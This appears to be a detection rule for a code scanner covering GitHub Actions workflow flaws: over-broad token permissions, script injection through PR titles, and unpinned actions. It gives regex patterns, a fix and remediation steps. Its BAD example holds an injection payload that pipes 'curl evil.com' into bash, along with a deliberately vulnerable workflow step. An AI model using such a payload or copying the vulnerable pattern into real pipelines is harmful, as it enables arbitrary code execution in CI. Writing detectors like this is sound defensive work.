---
id: CICD-WORKFLOW-TOKEN-SCOPE
severity_max: HIGH
applies_to: yaml, yml
---

# CI/CD Workflow Token Over-Permissioning & Script Injection

## Intent

Detects security vulnerabilities in CI/CD pipeline definitions (GitHub Actions workflows under `.github/workflows/`). Common flaws include granting excessive `GITHUB_TOKEN` permissions (e.g. `permissions: write-all`), evaluating untrusted PR titles/comments directly in inline shell scripts (`github.event.pull_request.title`), or referencing unpinned third-party actions by mutable tags instead of immutable commit SHA hashes.

Reference OWASP Cheat Sheet Series: `GitHub_Actions_Security_Cheat_Sheet.md` & `CI_CD_Security_Cheat_Sheet.md`.

## When HIGH / CRITICAL

- Workflow uses `pull_request_target` trigger combined with explicit checkout of untrusted PR code.
- Workflow grants write permissions (`contents: write`, `pull-requests: write`, `write-all`) while running untrusted scripts.
- Untrusted event variables (`github.event.issue.body`, `github.event.pull_request.title`) are expanded directly inside inline `run:` bash steps.

## When MEDIUM / LOW

- Third-party actions referenced by branch tag (e.g. `uses: actions/checkout@v4`) instead of full 40-character commit SHA hash.

## Search patterns (suggestions)

```yaml
permissions:\s*write-all
pull_request_target
\$\{\{\s*github\.event\.
uses:\s*[^@]+@(main|master|v[0-9]+)
```

## Examples

### BAD — Inline Shell Injection of PR Title
```yaml
# BAD: PR title containing `"; curl evil.com | bash; "` executes arbitrary code
on:
  pull_request:

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: echo "Processing PR: ${{ github.event.pull_request.title }}" # Vulnerable!
```

### GOOD — Environment Variable Parameterization & Scoped Permissions
```yaml
# GOOD: Explicit minimal permissions & safe env var binding
permissions:
  contents: read

on:
  pull_request:

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - name: Print Title
        env:
          PR_TITLE: ${{ github.event.pull_request.title }}
        run: echo "Processing PR: $PR_TITLE" # Safe from injection
```

## Fix recommendation

1. Specify explicit minimal `permissions:` block at workflow and job levels (e.g. `permissions: contents: read`).
2. Pass untrusted GitHub event payload variables via environment variables (`env:`) instead of direct `${{ ... }}` inline expansion in bash scripts.
3. Pin third-party GitHub Actions using full 40-character commit SHAs (e.g., `uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11`).
